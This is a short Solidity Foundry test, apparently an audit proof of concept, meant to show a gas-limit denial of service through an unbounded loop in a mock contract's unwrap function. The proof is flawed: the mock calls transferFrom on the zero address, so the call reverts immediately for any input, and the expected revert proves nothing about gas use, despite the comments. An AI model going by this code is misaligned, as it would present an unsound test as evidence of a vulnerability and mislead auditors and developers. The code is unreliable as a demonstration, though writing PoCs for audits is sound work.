// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for the ERC721 token
interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract Caviar {
    // Mock function to demonstrate the vulnerability
    function unwrap(uint256[] memory tokenIds) public {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            // Simulate an ERC721 transfer
            IERC721(address(0)).transferFrom(msg.sender, address(this), tokenIds[i]);
        }
    }
}

contract ExploitTest is Test {
    Caviar caviar;

    function setUp() public {
        // Deploy the vulnerable contract
        caviar = new Caviar();
    }

    function test_exploit() public {
        // Step 1: Prepare a large array of tokenIds to trigger the gas limit issue
        uint256[] memory largeTokenIds = new uint256[](10000); // Large enough to exceed gas limit

        // Step 2: Attempt to call the unwrap function with the large array
        // Expect the transaction to revert due to out-of-gas
        vm.expectRevert();
        caviar.unwrap(largeTokenIds);

        // Note: In a real scenario, you would measure gas usage with gasleft() before and after
        // to demonstrate excessive gas consumption, but here we expect a revert due to OOG.
    }
}